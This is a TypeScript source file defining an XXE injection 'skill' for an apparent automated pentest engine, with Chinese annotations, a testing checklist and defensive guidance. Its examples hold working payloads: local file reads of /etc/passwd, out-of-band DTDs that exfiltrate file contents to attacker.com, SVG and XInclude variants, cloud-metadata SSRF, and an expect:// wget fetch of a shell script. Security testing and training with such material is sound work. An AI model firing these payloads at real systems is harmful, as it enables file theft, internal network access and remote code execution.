/**
 * HOS-Sec-Engine V2 - XXE Injection Skills
 * XXE 注入攻击专项 Skill 集合
 */

import { AttackDefenseSkill, DEFAULT_SKILL_RUNTIME } from '../../../types/skill';

export const xxeInjectionSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'web-xxe-001',
            name: 'XXE Injection Techniques',
            category: 'web',
            subCategory: 'xxe',
            riskLevel: 'critical',
            confidence: 0.90,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: ['xxe', 'xml-external-entity', 'file-read', 'oob-xxe', 'xinclude', 'parameter-entity', 'xml-parser'],
        },
        trigger: {
            scenarios: [
                '应用接收 XML 格式的请求体（如 SOAP API、XML-RPC、SAML',
                '文件上传功能接受 XML 文件（如 SVG、Office 文档、配置文件）',
                '应用使用 XML 解析器处理用户提供的数据',
                'API 支持 Content-Type: application/xml 的请',
                '存在 XML 转换功能（XSLT）或 XML 导入功能',
                '使用旧版 XML 解析库（libxml2、Xerces、SAX）',
            ],
            keywords: [
                'xxe',
                'xml external entity',
                'xml injection',
                '外部实体',
                'xml解析',
                'soap',
                'xml-rpc',
                'saml',
                'svg upload',
                'xml parser',
                'DOCTYPE',
                'ENTITY',
            ],
            aliases: [
                'xml entity injection',
                'xml bomb',
                'billion laughs',
                'xml 外部实体注入',
                'oob xxe',
                'blind xxe',
            ],
            indicators: [
                '请求 Content-Type ?application/xml ?text/xml',
                'XML 解析错误和 DTD 处理相关报错',
                '文件内容泄露到 XML 响应',
                'HTTP 请求从服务器发往攻击者控制的地址',
            ],
        },
        knowledge: {
            description: 'XML 外部实体 (XXE) 注入利用 XML 解析器对 DTD（文档类型定义）中外部实体的处理机制，读取服务器本地文件、发起服务端请求、执行内网端口扫描等。当 XML 解析器配置为允许处理外部实体时，攻击者通过构造恶意的DTD 引入外部资源，将其内容嵌入XML 文档返回或外带至攻击者服务器。XXE 在现代应用中仍常见于 SOAP API、旧系统、文件解析器（Office、PDF、SVG）等场景',
            symptoms: [
                'XML 请求中的 DOCTYPE 声明未被过滤或禁',
                'XML 解析错误信息暴露了文件路径或系统信息',
                '应用响应中包含被引用的外部文件内',
                '服务器向攻击者控制的 URL 发起 HTTP/DNS 请求',
                'XML 解析耗时异常（可能触发 XML Bomb / Billion Laughs 攻击',
            ],
            rootCauses: [
                'XML 解析器默认启用外部实体解析（?libxml2 默认允许',
                '未禁用 DTD 处理或外部实体加载',
                'XML 解析器未设置安全属性（?FEATURE_SECURE_PROCESSING',
                '应用的 XML 解析结果直接返回给客户端',
                '文件上传的 XML 类文件 类文件（SVG、DOCX、XLSX）被直接解析',
                'XML 转换（XSLT）中未限制文档函数访问',
            ],
            observations: [
                'PHP libxml < 2.9.0 默认启用外部实体。2.9.0+ 默认禁用但可手动开',
                'Java XXE 防护需要同时禁用多个特性（外部实体、DTD、XInclude',
                'Python lxml 默认安全，但 xml.etree.ElementTree 存在 XXE 风险',
                'Node.js ?libxmljs 和 xmldom 在旧版本中存在 XXE 漏洞',
                'SVG 文件本质是 XML，上传 SVG 可能触发 XXE',
                'Office 文档 (DOCX/XLSX/PPTX) ?ZIP 包，解压后包含 XML 文件可被注入',
                'OOB XXE（带外 XXE）适用于Blind XXE 场景，通过 HTTP/DNS 外带数据',
                '参数实体 (%entity;) 只能在 DTD 内部使用，但可用于构造复杂攻击链',
            ],
            commonMistakes: [
                '只测试简单的文档件读取 payload，未尝试 OOB XXE',
                '未识别 XML 解析器的具体类型和版本，使用不兼容的 payload',
                '忽略文件上传场景中的 XXE（SVG、Office 文档等）',
                'Blind XXE 中未正确配置接收服务器，导致无法捕获数据',
                '未测试 XInclude 作为替代攻击向量',
                'XML 响应被截断或编码导致数据无法正确提取',
            ],
            notes: [
                'XXE 测试时先用简单 payload 确认解析器是否处理外部实',
                'OOB XXE 需要攻击者控制的外部服务器接收数',
                '某些 XML 解析器限制 file:// 协议，但 http:// 仍可工作',
                'XXE ?SSRF 有重叠：外部实体引用可发起服务端请求',
                '现代框架默认安全配置降低了 XXE 风险，但旧系统仍普遍存在',
                'SVG XXE 是文件上传场景中最常见的 XXE 入口点',
            ],
        },
        action: {
            checklist: [
                '确认应用是否接受 XML 格式输入（请求体、文件上传、API 参数',
                '发送基础 XXE 探测 payload（DOCTYPE + ENTITY 声明',
                '根据响应判断是否盲注（无回显）或有回',
                '有回显：尝试 file:// 协议读取本地文件',
                '无回显：构建 OOB XXE 通过 HTTP/DNS 外带数据',
                '测试参数实体注入构造复杂攻击链',
                '测试 XInclude 作为替代注入方式',
                '尝试 PHP expect:// ?Java jar:// 等协议执行命',
                '文件上传场景测试 SVG、Office 文档 XXE',
                '确认 XML 解析器类型并针对性调整 payload',
            ],
            techniques: [
                '基础 XXE<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                'OOB XXE：通过外部 DTD 引用实现数据外带',
                '参数实体<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">',
                'XInclude：利用 XML Include 机制引入外部文件',
                'Blind XXE 数据外带：将文件内容拼接到 HTTP 请求 URL ',
                'PHP expect:// 协议：执行系统命',
                'Java jar:// 协议：访问 JAR 包内文件',
                'XML Bomb (Billion Laughs)：拒绝服务攻',
                'SVG XXE：在 SVG 文件中嵌入 XXE payload',
                '编码绕过：UTF-16、Base64 编码 DTD 绕过 WAF',
            ],
            examples: [
                {
                    name: '基础 XXE 文件读取',
                    description: '利用外部实体读取服务器本地文件',
                    content: "Payload:\n" +
                        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<!DOCTYPE foo [\n" +
                        "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                        "]>\n" +
                        "<data>&xxe;</data>\n" +
                        "\n" +
                        "Windows 变体:\n" +
                        "<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">\n" +
                        "\n" +
                        "SOAP API 中的注入:\n" +
                        "<?xml version=\"1.0\"?>\n" +
                        "<!DOCTYPE foo [\n" +
                        "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                        "]>\n" +
                        "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
                        "  <soapenv:Header/>\n" +
                        "  <soapenv:Body>\n" +
                        "    <user>&xxe;</user>\n" +
                        "  </soapenv:Body>\n" +
                        "</soapenv:Envelope>\n" +
                        "\n" +
                        "原理: 解析器处理 DOCTYPE 中的 ENTITY 声明，将文件内容替换为 &xxe; 实体引用处",
                },
                {
                    name: 'OOB XXE 带外数据外带',
                    description: '在Blind XXE 场景下，通过外部 DTD 将文件内容发送到攻击者服务器',
                    content: "攻击流程:\n" +
                        "1. 攻击者托管 evil.dtd ?http://attacker.com/evil.dtd\n" +
                        "2. 发送 XXE payload 引用外部 DTD\n" +
                        "3. 外部 DTD 中包含数据外带逻辑\n" +
                        "4. 解析器执行 DTD，文件内容被发送到攻击者服务器\n" +
                        "\n" +
                        "?Payload:\n" +
                        "<?xml version=\"1.0\"?>\n" +
                        "<!DOCTYPE root [\n" +
                        "  <!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">\n" +
                        "  %remote;\n" +
                        "  %send;\n" +
                        "]>\n" +
                        "<data>test</data>\n" +
                        "\n" +
                        "evil.dtd 内容:\n" +
                        "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n" +
                        "<!ENTITY % send \"<!ENTITY &#x25; trick SYSTEM 'http://attacker.com/?data=%file;'>\">\n" +
                        "%send;\n" +
                        "\n" +
                        "原理: 参数实体 %file 读取文件内容后 send 构造新的参数实体\n" +
                        "     将文件内容拼接到 HTTP 请求 URL 参数中发送\n" +
                        "注意: 文件内容中的特殊字符可能导致 URL 无效，需编码处理",
                },
                {
                    name: '参数实体注入复杂攻击',
                    description: '利用参数实体 (%entity;) 在DTD 内部构造多阶段攻击',
                    content: "参数实体只能在 DTD 内部使用，但可构造复杂的攻击链\n" +
                        "\n" +
                        "Payload:\n" +
                        "<?xml version=\"1.0\"?>\n" +
                        "<!DOCTYPE root [\n" +
                        "  <!ENTITY % payload \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">\n" +
                        "  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n" +
                        "  %payload;\n" +
                        "  %exfil;\n" +
                        "]>\n" +
                        "<data/>  \n" +
                        "\n" +
                        "绕过过滤:\n" +
                        "如果 SYSTEM 关键字被过滤:\n" +
                        "<!ENTITY % dtd SYSTEM \"http://attacker.com/payload.dtd\">\n" +
                        "%dtd;\n" +
                        "\n" +
                        "?payload.dtd 中写入实际攻击 payload，绕过对 SYSTEM/ENTITY 的检测\n" +
                        "\n" +
                        "原理: 参数实体在 DTD 解析阶段被处理，可用于动态构造其他实体\n" +
                        "     参数实体引用 %entity; 只能在 DTD 子集中使用",
                },
                {
                    name: 'XInclude 攻击',
                    description: '当DOCTYPE 被过滤时，使用XInclude 机制引入外部文件',
                    content: "XInclude ?XML 标准的一部分，用于包含外部 XML 文档:\n" +
                        "\n" +
                        "Payload:\n" +
                        "<?xml version=\"1.0\"?>\n" +
                        "<data xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n" +
                        "  <xi:include href=\"file:///etc/passwd\" parse=\"text\"/>\n" +
                        "</data>\n" +
                        "\n" +
                        "读取 Java 资源:\n" +
                        "<xi:include href=\"http://attacker.com/malicious.xml\" parse=\"xml\"/>\n" +
                        "\n" +
                        "原理: XInclude 不需要 DOCTYPE 声明，绕过对 DOCTYPE 的过滤\n" +
                        "     某些 XML 解析器在处理 XInclude 时不应用 XXE 防护\n" +
                        "     parse=\"text\" 将文件作为纯文本包含，parse=\"xml\" 作为 XML 解析\n" +
                        "\n" +
                        "适用: Java (Xerces)、PHP (libxml) 和 NET 等支持 XInclude 的解析器\n" +
                        "注意: 需要在 XML 中声明 XInclude 命名空间",
                },
                {
                    name: 'SVG 文件上传 XXE',
                    description: '通过上传包含 XXE payload 的SVG 文件利用文件上传入口',
                    content: "SVG 本质是 XML 格式，可直接嵌入 XXE payload:\n" +
                        "\n" +
                        "evil.svg:\n" +
                        "<?xml version=\"1.0\" standalone=\"yes\"?>\n" +
                        "<!DOCTYPE svg [\n" +
                        "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                        "]>\n" +
                        "<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                        "  <text x=\"10\" y=\"20\">&xxe;</text>\n" +
                        "</svg>\n" +
                        "\n" +
                        "OOB 变体:\n" +
                        "<?xml version=\"1.0\"?>\n" +
                        "<!DOCTYPE svg [\n" +
                        "  <!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">\n" +
                        "  %remote;\n" +
                        "  %send;\n" +
                        "]>\n" +
                        "<svg xmlns=\"http://www.w3.org/2000/svg\">\n" +
                        "  <image xlink:href=\"data:image/png;base64,placeholder\"/>\n" +
                        "</svg>\n" +
                        "\n" +
                        "原理: 图像处理库或浏览器解析 SVG 时处理其中的 DTD\n" +
                        "     很多应用只检查 SVG 文件扩展名或 MIME 类型，不检查内容\n" +
                        "适用: 任何接受 SVG 上传并解析的应用",
                },
                {
                    name: 'PHP expect:// 命令执行',
                    description: '利用 PHP ?expect:// 协议通过 XXE 执行系统命令',
                    content: "前提: PHP 安装的 expect 扩展（非默认安装）\n" +
                        "\n" +
                        "Payload:\n" +
                        "<?xml version=\"1.0\"?>\n" +
                        "<!DOCTYPE foo [\n" +
                        "  <!ENTITY xxe SYSTEM \"expect://id\">\n" +
                        "]>\n" +
                        "<data>&xxe;</data>\n" +
                        "\n" +
                        "复杂命令:\n" +
                        "<!ENTITY xxe SYSTEM \"expect://cat /etc/passwd\">\n" +
                        "<!ENTITY xxe SYSTEM \"expect://wget http://attacker.com/shell.sh -O /tmp/shell.sh\">\n" +
                        "\n" +
                        "PHP 其他协议:\n" +
                        "php://filter/read=convert.base64-encode/resource=/etc/passwd\n" +
                        "php://input (配合 POST body 数据)\n" +
                        "\n" +
                        "原理: expect:// 协议将 URI 部分作为系统命令执行\n" +
                        "     返回命令输出作为实体值\n" +
                        "适用: PHP + expect 扩展安装的环境",
                },
                {
                    name: 'Java XXE 多协议利',
                    description: '利用 Java XML 解析器的多种协议实现文件读取和SSRF',
                    content: "Java 支持的协议:\n" +
                        "1. file:// - 读取本地文件\n" +
                        "2. http:// - 发起 HTTP 请求 (SSRF)\n" +
                        "3. jar:// - 访问 JAR 包内文件\n" +
                        "4. netdoc:// - JDK 内部协议，列出目录\n" +
                        "\n" +
                        "文件读取:\n" +
                        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                        "\n" +
                        "SSRF:\n" +
                        "<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n" +
                        "\n" +
                        "JAR 协议:\n" +
                        "<!ENTITY xxe SYSTEM \"jar:http://attacker.com/malicious.jar!/config.xml\">\n" +
                        "\n" +
                        "Java 防护配置 (常被遗漏):\n" +
                        "factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n" +
                        "factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n" +
                        "factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n" +
                        "factory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n" +
                        "factory.setExpandEntityReferences(false);\n" +
                        "\n" +
                        "原理: 需要同时禁用多个特性才能完全防止 XXE\n" +
                        "     许多应用只配置部分特性，留下攻击面",
                },
            ],
        },
        validation: {
            indicators: [
                '响应中包含 /etc/passwd 或 win.ini 等文件内',
                '攻击者服务器收到来自目标服务器的 HTTP 请求',
                'DNS 查询日志中出现目标服务器的 DNS 请求',
                'XML 解析错误暴露的 DTD 处理信息',
                '响应时间异常（XML Bomb 导致解析缓慢或超时',
            ],
            successSigns: [
                '成功读取本地文件并在响应中返回（有回显 XXE',
                '成功通过 OOB XXE 外带文件内容到攻击者服务器',
                '确认目标存在 XXE 漏洞（通过带外请求验证',
                'XXE 结合 SSRF 访问内网服务',
                '通过 expect:// 等协议执行系统命令',
            ],
            falsePositiveSigns: [
                '响应中的文档件内容为静态示例数据而非真实文件',
                'HTTP 请求由其他机制触发而非 XXE（如页面中的外部资源引用',
                'XML 解析器已禁用外部实体，payload 被当作普通文本返',
                '错误信息为应用通用错误而非 XML 解析错误',
            ],
        },
        defense: {
            recommendations: [
                '禁用 DTD 处理：设置解析器特性 disallow-doctype-decl=true',
                '禁用外部实体：external-general-entities=false, external-parameter-entities=false',
                '启用 FEATURE_SECURE_PROCESSING 限制实体扩展',
                '使用 JSON 替代 XML 作为数据交换格式',
                '对用户提供的 XML 进行 Schema 验证，拒绝包含 DOCTYPE 的文档',
                '使用白名单验证 XML 结构和元素',
                '更新 XML 解析库到最新版本（libxml2 2.9.0+ 默认禁用外部实体。但可手动开启',
            ],
            mitigations: [
                '实施输入验证：拒绝包含 DOCTYPE、ENTITY 声明的 XML',
                '配置 WAF 规则检查 XXE payload（DOCTYPE、ENTITY、SYSTEM',
                '使用沙箱环境解析不可信的 XML 文档',
                '限制 XML 解析器的网络访问（防止 SSRF',
                '?SVG ?XML 类文件进行内容净化后存储',
                '实施网络分段，限制应用服务器的内网访问能力',
            ],
            references: [
                'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
                'https://portswigger.net/web-security/xxe',
                'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
                'https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md',
                'https://www.invicti.com/blog/web-security/xml-external-entity-xxe-attacks/',
            ],
        },
        quality: {
            confidence: 0.90,
            reviewed: true,
            tested: true,
            lastVerified: '2026-06',
        },
        playbooks: ['web-pentest-full'],
        phase: 'vulnerability-scanning',
        enabled: true,
        runtime: {
            requiresAgent: false,
            agentCount: 1,
            parallelizable: true,
            requiresNetwork: true,
            requiresSandbox: false,
            dependencies: [],
            estimatedTokens: 3000,
        },
    },
];
